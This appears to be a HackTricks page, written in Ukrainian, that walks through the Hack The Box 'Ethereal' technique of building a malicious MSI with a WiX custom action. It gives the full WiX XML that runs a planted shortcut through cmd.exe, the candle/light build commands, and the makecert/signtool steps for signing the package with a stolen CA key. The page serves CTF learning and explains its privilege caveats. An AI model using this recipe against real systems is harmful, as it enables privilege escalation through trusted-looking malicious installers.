# Створення MSI з Custom-Action за допомогою WiX

{{#include ../../banners/hacktricks-training.md}}

Цей історичний ланцюжок Hack The Box використовував WiX Toolset v3 для створення MSI, який запускав попередньо розміщений файл `.lnk`. **MSI не має привілеїв автоматично**: виконання відбувається в контексті, визначеному політикою Windows Installer, атрибутами custom-action і користувачем, який його встановлює. У наведеному сценарії зловмисник також викрав довірений signing CA і розмістив підписаний MSI у папці, яку відстежував інший користувач.<sup>[[1]](#references)[[3]](#references)</sup>

Для всебічного розуміння прикладів використання wix MSI рекомендується переглянути [цю сторінку](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Тут можна знайти різні приклади, що демонструють використання wix MSI.<sup>[[2]](#references)</sup>

MSI запускає `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. Оригінальний XML для WiX v3 наведено нижче:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` оголошує мінімальну версію Windows Installer, а `Compressed="yes"` позначає пакет як стиснений. `Stage1` є відкладеною, але має `Impersonate="yes"`, тому виконується з impersonated token користувача, який здійснює встановлення; зміна привілеїв у цьому сценарії відбулася через привілейованого користувача, який згодом відкрив MSI, а не тому, що цей атрибут магічним чином надає SYSTEM.<sup>[[3]](#references)</sup>

Скомпілюйте вихідний код у WiX-об’єкт за допомогою `candle.exe`:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Пов’яжіть цей об’єкт із MSI за допомогою `light.exe`:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Крок підписання, використаний в оригінальному ланцюжку

Цільовий робочий процес приймав пакети, підписані скомпрометованим внутрішнім CA. В описі на основі отриманих `MyCA.cer`/`MyCA.pvk` було створено сертифікат підписання, сформовано PFX і підписано MSI:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
Потім attacker розмістив підписаний пакет у `D:\DEV\MSIs` і очікував, поки privileged workflow/user виконає його. Під час адаптації техніки збережіть цю передумову: без elevated installation path, небезпечної політики на кшталт `AlwaysInstallElevated` або privileged victim цей пакет виконується лише з правами поточного користувача.

## References

- [1] [Hack The Box - Ethereal: Створення шкідливого msi та отримання root - Блог 0xRick](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Короткий вступ: Створення MSI-інсталятора за допомогою WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Відкладене виконання custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
